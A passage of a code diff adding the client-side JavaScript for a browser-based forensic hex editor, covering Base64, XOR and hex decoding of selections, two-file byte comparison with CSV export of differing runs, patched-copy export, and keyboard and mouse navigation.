+      let s = Array.from(b, c => String.fromCharCode(c)).join('').replace(/\s+/g, '').replace(/-/g, '+').replace(/_/g, '/');
+      const m = s.match(/[A-Za-z0-9+/]+={0,2}/g);
+      if (!m) throw new Error('No Base64 characters in the selection');
+      s = m.reduce((a, x) => (x.length > a.length ? x : a), '');
+      s = s.replace(/=+$/, '');
+      while (s.length % 4) s += '=';
+      const bin = atob(s);
+      decResults.push({ title: 'Base64 decoded', bytes: Uint8Array.from(bin, c => c.charCodeAt(0)), tag: 'b64' });
+    } else if (mode === 'xor') {
+      const key = parseHexKey($('#decKey').value);
+      if (!key) throw new Error('Enter the XOR key as hex bytes, like 5A or DE AD BE EF');
+      decResults.push({ title: `XOR key ${Array.from(key, k => HX2[k]).join(' ')}`, bytes: b.map((c, i) => c ^ key[i % key.length]), tag: 'xor' + Array.from(key, k => HX2[k]).join('') });
+    } else if (mode === 'brute') {
+      const scored = [];
+      const sample = b.subarray(0, 4096);
+      for (let k = 1; k < 256; k++) scored.push([printableScore(sample.map(c => c ^ k)), k]);
+      scored.sort((x, y) => y[0] - x[0]);
+      for (const [score, k] of scored.slice(0, 5)) decResults.push({ title: `XOR key ${HX2[k]} · ${Math.round(Math.min(score, 1) * 100)}% printable`, bytes: b.map(c => c ^ k), tag: 'xor' + HX2[k] });
+    } else if (mode === 'hexstr') {
+      const txt = Array.from(b, c => String.fromCharCode(c)).join('').replace(/0x/gi, '').replace(/[^0-9a-f]/gi, '');
+      if (txt.length < 2) throw new Error('No hex digits in the selection');
+      const out = new Uint8Array(Math.floor(txt.length / 2));
+      for (let i = 0; i < out.length; i++) out[i] = parseInt(txt.substr(i * 2, 2), 16);
+      decResults.push({ title: 'Hex text → bytes', bytes: out, tag: 'hex' });
+    }
+  } catch (e) { $('#decOut').innerHTML = `<p class="note">${esc(e.message === 'The string to be decoded is not correctly encoded.' ? 'That selection is not valid Base64' : e.message)}</p>`; return; }
+
+  $('#decOut').innerHTML = decResults.map((r, i) => {
+    const p = textPreview(r.bytes);
+    const sig = window.detectMagic(r.bytes.subarray(0, 64));
+    return `<div class="dec-block"><header><b>${esc(r.title)}</b><span>${r.bytes.length.toLocaleString()} bytes · ${p.kind}${sig ? ' · ' + esc(sig.label) : ''}</span>
+      <span class="grow"></span>
+      <button class="btn ghost small" data-copy="${i}" type="button">Copy</button>
+      <button class="btn ghost small" data-save="${i}" type="button">Save</button></header>
+      <pre>${esc(p.text)}</pre></div>`;
+  }).join('');
+  decResults.forEach(r => (r.src = src));
+}
+
+async function saveDecoded(i) {
+  const r = decResults[i]; if (!r) return;
+  const stem = activeFile().name.replace(/\.[^.]*$/, '');
+  try {
+    const res = await api('savebytes', { method: 'POST', body: { id: activeFile().id, name: `${stem}_${h0x(r.src.start)}_${r.tag}.bin`, data: b64encode(r.bytes), note: `${r.title} of ${h0x(r.src.start)}-${h0x(r.src.end)}` } });
+    toast('Saved ' + res.file);
+  } catch (e) { toast(e.message); }
+}
+
+// ---------------------------------------------------------------- export
+async function exportPatched() {
+  if (!S.edits.size) return;
+  try {
+    const r = await api('export', { method: 'POST', body: { id: S.file.id, edits: [...S.edits] } });
+    switchTab('sel');
+    $('#selOut').innerHTML = outCard(`Patched copy · ${r.changes} change${r.changes === 1 ? '' : 's'}`, r, '<span>The original file was not modified.</span>');
+    toast('Exported ' + r.file);
+  } catch (e) { toast(e.message); }
+}
+
+// ---------------------------------------------------------------- compare
+async function openB(body) {
+  if (!S.file) return toast('Open the A file first, then open B to compare against it');
+  try { loadB(await api('open', { method: 'POST', body: { ...body, slot: 'b' } })); }
+  catch (e) { toast(e.message, 5000); }
+}
+
+function loadB(f) {
+  S.B = { file: f, size: f.size, chunks: new Map(), loading: new Set(), hash: null };
+  S.cmp = null; S.runs = []; S.diffIdx = -1;
+  S.digits = Math.max(8, viewSize().toString(16).length);
+  document.body.classList.add('comparing');
+  $('#paneB').hidden = false;
+  $('#evidenceB').hidden = false;
+  document.querySelector('.slot-a').hidden = false;
+  $('#evNameB').textContent = f.name;
+  $('#evNameB').title = f.name;
+  $('#evTypeB').textContent = f.size ? 'Identifying…' : 'Empty file';
+  const d = f.size - S.size;
+  $('#evSizeB').textContent = fmtSize(f.size) + (d ? ` · ${d > 0 ? '+' : '−'}${Math.abs(d).toLocaleString()} vs A` : ' · same as A');
+  $('#evMd5B').textContent = $('#evShaB').textContent = 'hashing…';
+  renderHead();
+  render();
+  pollHash(f.id, true);
+  runCompare();
+}
+
+function closeB() {
+  if (!S.B) return;
+  api('close', { method: 'POST', body: { slot: 'b' } }).catch(() => {});
+  S.B = null; S.cmp = null; S.runs = []; S.diffIdx = -1; S.side = 'a';
+  S.digits = Math.max(8, S.size.toString(16).length);
+  document.body.classList.remove('comparing');
+  $('#paneB').hidden = true;
+  $('#evidenceB').hidden = true;
+  document.querySelector('.slot-a').hidden = true;
+  $('#cmpSummary').innerHTML = ''; $('#cmpRuns').innerHTML = ''; $('#cmpOut').innerHTML = '';
+  $('#cmpNav').hidden = true; $('#cmpProg').hidden = true;
+  renderHead();
+  render();
+}
+
+async function runCompare() {
+  if (!S.file || !S.B) return;
+  let job;
+  try { ({ job } = await api('compare', { method: 'POST', body: { a: S.file.id, b: S.B.file.id } })); }
+  catch (e) { $('#cmpSummary').innerHTML = `<dt>Error</dt><dd>${esc(e.message)}</dd>`; return; }
+  S.cmp = { job, state: 'running', map: null };
+  S.runs = []; S.diffIdx = -1;
+  $('#cmpRuns').innerHTML = ''; $('#cmpOut').innerHTML = '';
+  $('#cmpProg').hidden = false;
+  switchTab('cmp');
+  while (S.cmp && S.cmp.job === job) {
+    let r;
+    try { r = await api(`compare?job=${job}&since=${S.runs.length}&map=1`); }
+    catch (e) { $('#cmpSummary').innerHTML = `<dt>Error</dt><dd>${esc(e.message)}</dd>`; break; }
+    if (!S.cmp || S.cmp.job !== job) return;
+    const { runs, ...rest } = r;
+    Object.assign(S.cmp, rest);
+    appendRuns(runs);
+    $('#cmpProg').firstElementChild.style.width = (r.total ? (r.done / r.total) * 100 : 100) + '%';
+    if (r.state !== 'running') {
+      if (r.tail) appendRuns([[r.tail.start, r.tail.len, r.tail.onlyIn]]);
+      break;
+    }
+    renderCmpSummary();
+    drawTrack();
+    await sleep(250);
+  }
+  $('#cmpProg').hidden = true;
+  renderCmpSummary();
+  $('#cmpNav').hidden = !S.runs.length;
+  render();
+  if (S.runs.length && S.diffIdx < 0) gotoRun(0, false);
+}
+
+function appendRuns(list) {
+  if (!list || !list.length) return;
+  const ol = $('#cmpRuns'), frag = document.createDocumentFragment();
+  for (const run of list) {
+    const i = S.runs.length;
+    S.runs.push(run);
+    const li = document.createElement('li');
+    li.dataset.i = i;
+    const n = run[1];
+    li.innerHTML = `<span class="ro">${hexOff(run[0])}</span><span class="rp">${n.toLocaleString()} byte${n === 1 ? '' : 's'}${run[2] ? ' only in ' + run[2] : ''}</span>`;
+    frag.appendChild(li);
+  }
+  ol.appendChild(frag);
+}
+
+function renderCmpSummary() {
+  const c = S.cmp, dl = $('#cmpSummary');
+  if (!c || !S.B) { dl.innerHTML = ''; return; }
+  const rows = [];
+  const kv = (k, v) => rows.push(`<dt>${k}</dt><dd>${v}</dd>`);
+  const pct = c.total ? Math.floor((c.done / c.total) * 100) : 0;
+  if (c.state === 'running') kv('Status', `Comparing… ${pct}%`);
+  else if (c.state === 'error') kv('Status', 'Failed: ' + esc(c.error));
+  else if (c.state === 'cancelled') kv('Status', 'Stopped');
+  if (c.state === 'done') {
+    const same = !c.diffBytes && !c.tail;
+    kv('Result', same ? 'Identical, byte for byte' : `${c.runCount.toLocaleString()} differing run${c.runCount === 1 ? '' : 's'}${c.tail ? ' plus a size difference' : ''}`);
+  }
+  if (c.diffBytes !== undefined && c.common !== undefined) {
+    const p = c.common ? (c.diffBytes / c.common) * 100 : 0;
+    kv('Bytes differ', `${c.diffBytes.toLocaleString()} of ${c.common.toLocaleString()} compared (${p < 0.01 && c.diffBytes ? '< 0.01' : p.toFixed(2)}%)`);
+  }
+  if (c.firstDiff !== null && c.firstDiff !== undefined) kv('First difference', h0x(c.firstDiff));
+  if (c.tail) kv('Size difference', `${c.tail.len.toLocaleString()} bytes only in ${c.tail.onlyIn}, from ${h0x(c.tail.start)}`);
+  if (c.truncated) kv('Note', 'Run list stops at 10,000. Totals are still exact.');
+  if (S.hash && S.B.hash) kv('Hashes', S.hash.sha256 === S.B.hash.sha256 ? 'SHA-256 matches' : 'SHA-256 differs');
+  if (c.ms !== undefined) kv('Time', `${(c.ms / 1000).toFixed(2)} s`);
+  dl.innerHTML = rows.join('');
+}
+
+function runAt(o) {
+  let lo = 0, hi = S.runs.length - 1;
+  while (lo <= hi) {
+    const m = (lo + hi) >> 1, r = S.runs[m];
+    if (o < r[0]) hi = m - 1; else if (o >= r[0] + r[1]) lo = m + 1; else return r;
+  }
+  return null;
+}
+
+function gotoRun(i, focusGrid = true) {
+  if (!S.runs.length) return;
+  i = (i + S.runs.length) % S.runs.length;
+  S.diffIdx = i;
+  const [o, len] = S.runs[i];
+  S.cur = o; S.anchor = len > 1 ? o + len - 1 : null; S.nib = null; S.match = null;
+  const row = Math.floor(o / ROW);
+  if (row < S.top || row >= S.top + S.rows) centerOn(o);
+  document.querySelectorAll('#cmpRuns li.on').forEach(li => li.classList.remove('on'));
+  const li = $(`#cmpRuns li[data-i="${i}"]`);
+  if (li) {
+    li.classList.add('on');
+    const ol = li.parentElement;
+    if (li.offsetTop < ol.scrollTop) ol.scrollTop = li.offsetTop;
+    else if (li.offsetTop + li.offsetHeight > ol.scrollTop + ol.clientHeight) ol.scrollTop = li.offsetTop + li.offsetHeight - ol.clientHeight;
+  }
+  render();
+  if (focusGrid) $('#grid').focus();
+}
+
+function gotoDiff(dir) {
+  if (!S.B) return toast('Open a B file in the Compare tab first');
+  if (!S.runs.length) return toast(S.cmp && S.cmp.state === 'running' ? 'Still comparing…' : 'No differences');
+  let i;
+  if (dir > 0) { i = S.runs.findIndex(r => r[0] > S.cur); if (i < 0) i = 0; }
+  else { i = -1; for (let k = S.runs.length - 1; k >= 0; k--) if (S.runs[k][0] < S.cur) { i = k; break; } if (i < 0) i = S.runs.length - 1; }
+  gotoRun(i);
+}
+
+async function saveRunsCsv() {
+  if (!S.B || !S.runs.length) return;
+  const q = v => `"${String(v).replace(/"/g, '""')}"`;
+  const lines = [
+    `# A,${q(S.file.path)},${S.size},${S.hash ? S.hash.sha256 : ''}`,
+    `# B,${q(S.B.file.path)},${S.B.size},${S.B.hash ? S.B.hash.sha256 : ''}`,
+    'start_hex,start,length,end_hex,only_in',
+    ...S.runs.map(([o, n, only]) => `${h0x(o)},${o},${n},${h0x(o + n - 1)},${only || ''}`),
+  ];
+  const stem = f => f.name.replace(/\.[^.]*$/, '');
+  try {
+    const r = await api('savebytes', { method: 'POST', body: { id: S.file.id, name: `${stem(S.file)}_vs_${stem(S.B.file)}_diff.csv`, data: b64encode(new TextEncoder().encode(lines.join('\n') + '\n')), note: 'compare runs' } });
+    $('#cmpOut').innerHTML = outCard('Difference runs saved', r);
+  } catch (e) { toast(e.message); }
+}
+
+// ---------------------------------------------------------------- recent paths
+function openFiles(files, target) {
+  files = [...files].filter(f => f && f.size !== undefined);
+  if (!files.length) return;
+  if (files.length >= 2) {
+    openWith({ file: files[0] }).then(() => openB({ file: files[1] }));
+    if (files.length > 2) toast('Opened the first two files as A and B');
+    return;
+  }
+  if (target === 'b' && S.file) openB({ file: files[0] });
+  else openWith({ file: files[0] });
+}
+
+// ---------------------------------------------------------------- ui wiring
+function switchTab(name) {
+  document.querySelectorAll('.tab').forEach(t => { const on = t.dataset.tab === name; t.classList.toggle('on', on); t.setAttribute('aria-selected', on); });
+  document.querySelectorAll('.tabpane').forEach(p => (p.hidden = p.dataset.pane !== name));
+}
+function setEndian(le) {
+  S.le = le;
+  $('#leBtn').classList.toggle('on', le); $('#leBtn').setAttribute('aria-pressed', le);
+  $('#beBtn').classList.toggle('on', !le); $('#beBtn').setAttribute('aria-pressed', !le);
+  renderInspector(); renderStatus();
+}
+
+$('#fileA').addEventListener('change', e => { openFiles(e.target.files, 'a'); e.target.value = ''; });
+$('#fileB').addEventListener('change', e => { if (!S.file) { toast('Open the A file first'); } else openFiles(e.target.files, 'b'); e.target.value = ''; });
+document.querySelectorAll('label.btn[for]').forEach(l => l.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); $('#' + l.htmlFor).click(); } }));
+$('#logBtn').addEventListener('click', () => { const n = window.HexesBackend.downloadLog(); toast(n ? `Downloaded the session log (${n} entr${n === 1 ? 'y' : 'ies'})` : 'Nothing logged yet. Open a file first.'); });
+let dragDepth = 0;
+window.addEventListener('dragenter', e => { if ([...(e.dataTransfer?.types || [])].includes('Files')) { e.preventDefault(); dragDepth++; document.body.classList.add('dragging'); } });
+window.addEventListener('dragleave', () => { if (--dragDepth <= 0) { dragDepth = 0; document.body.classList.remove('dragging'); } });
+window.addEventListener('dragover', e => { if ([...(e.dataTransfer?.types || [])].includes('Files')) e.preventDefault(); });
+window.addEventListener('drop', e => {
+  if (!e.dataTransfer?.files?.length) return;
+  e.preventDefault(); dragDepth = 0; document.body.classList.remove('dragging');
+  const onB = !!(e.target.closest && e.target.closest('#paneB, [data-pane="cmp"], #evidenceB'));
+  openFiles(e.dataTransfer.files, onB ? 'b' : 'a');
+});
+$('#sampleBtn').addEventListener('click', () => openWith({ sample: true }));
+$('#gotoForm').addEventListener('submit', e => {
+  e.preventDefault();
+  if (!S.file) return;
+  const o = parseOffset($('#gotoInput').value);
+  if (o === null) return toast('Use 0x1F00, 7936, 1F00h, or +0x10 / -16 for relative jumps');
+  if (o < 0 || o >= viewSize()) return toast(`Offset ${h0x(Math.max(o, 0))} is outside the file (size ${h0x(viewSize())})`);
+  S.anchor = null; S.cur = o; S.nib = null;
+  centerOn(o); render();
+  $('#grid').focus();
+});
+$('#leBtn').addEventListener('click', () => setEndian(true));
+$('#beBtn').addEventListener('click', () => setEndian(false));
+$('#copyHashes').addEventListener('click', () => {
+  if (!S.file) return;
+  if (!S.hash) return toast('Hashing is still running');
+  copyText(`File: ${S.file.name}\nSize: ${S.size} bytes\nModified: ${S.file.mtime || 'unknown'}\nMD5: ${S.hash.md5}\nSHA-256: ${S.hash.sha256}`, 'hashes');
+});
+
+$('#lockBtn').addEventListener('click', () => {
+  if (S.edit) { setEdit(false); return; }
+  if (!S.file) return toast('Open a file first');
+  $('#modal').hidden = false; $('#modalNo').focus();
+});
+$('#modalNo').addEventListener('click', () => { $('#modal').hidden = true; });
+$('#modalYes').addEventListener('click', () => { $('#modal').hidden = true; setEdit(true); $('#grid').focus(); });
+$('#exportBtn').addEventListener('click', exportPatched);
+$('#revertBtn').addEventListener('click', () => { S.edits.clear(); S.nib = null; updateEditUI(); render(); toast('All edits reverted'); });
+
+document.querySelectorAll('.tab').forEach(t => t.addEventListener('click', () => switchTab(t.dataset.tab)));
+$('#searchType').addEventListener('change', e => { $('#searchQ').placeholder = PLACEHOLDERS[e.target.value]; });
+$('#searchForm').addEventListener('submit', runSearch);
+$('#searchCancel').addEventListener('click', () => { if (S.job && S.jobFile) api(`search?id=${S.jobFile}&job=${S.job}&cancel=1`).catch(() => {}); });
+$('#searchResults').addEventListener('click', e => { const li = e.target.closest('li'); if (li) gotoHit(+li.dataset.i); });
+$('#decRun').addEventListener('click', runDecode);
+$('#decMode').addEventListener('change', e => { $('#decKey').hidden = e.target.value !== 'xor'; });
+$('#decKey').hidden = true;
+$('#decOut').addEventListener('click', e => {
+  const c = e.target.closest('[data-copy]'), s = e.target.closest('[data-save]');
+  if (c) { const r = decResults[+c.dataset.copy]; copyText(textPreview(r.bytes, Infinity).text, 'decoded text'); }
+  if (s) saveDecoded(+s.dataset.save);
+});
+$('#carveBtn').addEventListener('click', carve);
+$('#cmpForm').addEventListener('submit', e => e.preventDefault());
+$('#sampleB').addEventListener('click', () => openB({ sample: true }));
+$('#closeB').addEventListener('click', closeB);
+$('#diffPrev').addEventListener('click', () => gotoDiff(-1));
+$('#diffNext').addEventListener('click', () => gotoDiff(1));
+$('#cmpCsv').addEventListener('click', saveRunsCsv);
+$('#cmpRuns').addEventListener('click', e => { const li = e.target.closest('li'); if (li) gotoRun(+li.dataset.i); });
+$('#hashSelBtn').addEventListener('click', hashSel);
+$('#copyHexBtn').addEventListener('click', () => copySel('hex'));
+$('#copyTxtBtn').addEventListener('click', () => copySel('text'));
+
+// grid mouse (both panes)
+const grid = $('#grid');
+let dragging = false, dragEl = null;
+function byteFromEvent(e) {
+  const el = e.target.closest && e.target.closest('[data-o]');
+  return el ? { o: +el.dataset.o, pane: el.parentElement.classList.contains('as') ? 'ascii' : 'hex' } : null;
+}
+function bindGrid(el, side) {
+  el.addEventListener('mousedown', e => {
+    const hit = byteFromEvent(e);
+    if (!hit) return;
+    e.preventDefault();
+    el.focus();
+    if (S.side !== side) S.nib = null;
+    S.side = side; S.pane = hit.pane; S.nib = null;
+    if (e.shiftKey) { if (S.anchor === null) S.anchor = S.cur; S.cur = hit.o; }
+    else { S.cur = hit.o; S.anchor = null; S.dragFrom = hit.o; dragging = true; dragEl = el; }
+    render();
+  });
+  el.addEventListener('mousemove', e => {
+    if (!dragging || dragEl !== el) return;
+    const rect = el.getBoundingClientRect();
+    if (e.clientY > rect.bottom - 6 && S.top < maxTop()) S.top++;
+    else if (e.clientY < rect.top + 6 && S.top > 0) S.top--;
+    const hit = byteFromEvent(e);
+    if (hit && hit.o !== S.cur) { S.anchor = S.dragFrom; S.cur = hit.o; render(); }
+  });
+  el.addEventListener('wheel', e => {
+    if (!S.file) return;
+    e.preventDefault();
+    S.wheel += e.deltaMode === 1 ? e.deltaY * S.rowH : e.deltaMode === 2 ? e.deltaY * S.rows * S.rowH : e.deltaY;
+    const n = Math.trunc(S.wheel / S.rowH);
+    if (n) { S.wheel -= n * S.rowH; S.top = clamp(S.top + n, 0, maxTop()); scheduleRender(); }
+  }, { passive: false });
+}
+bindGrid(grid, 'a');
+bindGrid($('#gridB'), 'b');
+window.addEventListener('mouseup', () => { dragging = false; dragEl = null; });
+
+// track scrubbing
+const track = $('#track');
+function scrub(e) {
+  if (!S.file) return;
+  const r = track.getBoundingClientRect();
+  const frac = clamp((e.clientY - r.top) / r.height, 0, 1);
+  S.top = clamp(Math.floor(frac * totalRows() - S.rows / 2), 0, maxTop());
+  scheduleRender();
+}
+track.addEventListener('pointerdown', e => { track.setPointerCapture(e.pointerId); scrub(e); });
+track.addEventListener('pointermove', e => { if (track.hasPointerCapture(e.pointerId)) scrub(e); });
+
+// keyboard
+document.addEventListener('keydown', e => {
+  const mod = e.ctrlKey || e.metaKey;
+  if (mod && e.code === 'KeyE') { e.preventDefault(); setEndian(!S.le); return; }
+  if (mod && e.code === 'KeyG') { e.preventDefault(); $('#gotoInput').focus(); $('#gotoInput').select(); return; }
+  if (mod && e.code === 'KeyF') { e.preventDefault(); switchTab('search'); $('#searchQ').focus(); $('#searchQ').select(); return; }
+  if (e.key === 'F3') { e.preventDefault(); gotoHit(S.hitIdx + (e.shiftKey ? -1 : 1)); return; }
+  if (e.key === 'F7') { e.preventDefault(); gotoDiff(e.shiftKey ? -1 : 1); return; }
+  if (e.key === 'Escape' && !$('#modal').hidden) { $('#modal').hidden = true; return; }
+  const tag = (e.target.tagName || '').toLowerCase();
+  if (tag === 'input' || tag === 'select' || tag === 'textarea' || tag === 'button') {
+    if (e.key === 'Escape') { e.target.blur(); grid.focus(); }
+    return;
+  }
+  if (!S.file || !viewSize()) return;
+  const page = S.rows * ROW, sh = e.shiftKey, last = viewSize() - 1;
+  switch (e.key) {
+    case 'ArrowLeft': e.preventDefault(); return moveTo(S.cur - 1, sh);
+    case 'ArrowRight': e.preventDefault(); return moveTo(S.cur + 1, sh);
+    case 'ArrowUp': e.preventDefault(); return moveTo(S.cur - ROW, sh);
+    case 'ArrowDown': e.preventDefault(); return moveTo(S.cur + ROW, sh);
+    case 'PageUp': e.preventDefault(); S.top = clamp(S.top - S.rows, 0, maxTop()); return moveTo(S.cur - page, sh);
+    case 'PageDown': e.preventDefault(); S.top = clamp(S.top + S.rows, 0, maxTop()); return moveTo(S.cur + page, sh);
+    case 'Home': e.preventDefault(); return moveTo(mod ? 0 : S.cur - (S.cur % ROW), sh);
+    case 'End': e.preventDefault(); return moveTo(mod ? last : S.cur - (S.cur % ROW) + ROW - 1, sh);
+    case 'Tab': e.preventDefault(); S.pane = S.pane === 'hex' ? 'ascii' : 'hex'; S.nib = null; return render();
+    case 'Escape': S.anchor = null; S.match = null; S.nib = null; return render();
+  }
+  if (mod && e.code === 'KeyA') { e.preventDefault(); S.anchor = 0; S.cur = Math.max(0, sideSize(S.side) - 1); return render(); }
+  if (mod && e.code === 'KeyC' && selRange()) { e.preventDefault(); return copySel(S.pane === 'ascii' ? 'text' : 'hex'); }
+  if (!S.edit || S.side !== 'a' || mod || e.altKey || e.key.length !== 1) return;
+  e.preventDefault();
+  if (S.pane === 'hex') {
+    const d = parseInt(e.key, 16);
+    if (!Number.isNaN(d) && /^[0-9a-f]$/i.test(e.key)) typeNibble(d);
+  } else {
+    const code = e.key.charCodeAt(0);
+    if (code < 256 && setByte(S.cur, code)) S.cur < S.size - 1 ? moveTo(S.cur + 1) : render();
+  }
+});
+
+window.addEventListener('resize', scheduleRender);
+window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', drawTrack);
+
+// ---------------------------------------------------------------- boot
+renderHead();
+render();
+{
+  const p = new URLSearchParams(location.search).get('sample');
+  if (p) openWith({ sample: true }).then(() => { if (p === 'compare') openB({ sample: true }); });
+}
+})();
+
+</script>
+</body>
+</html>
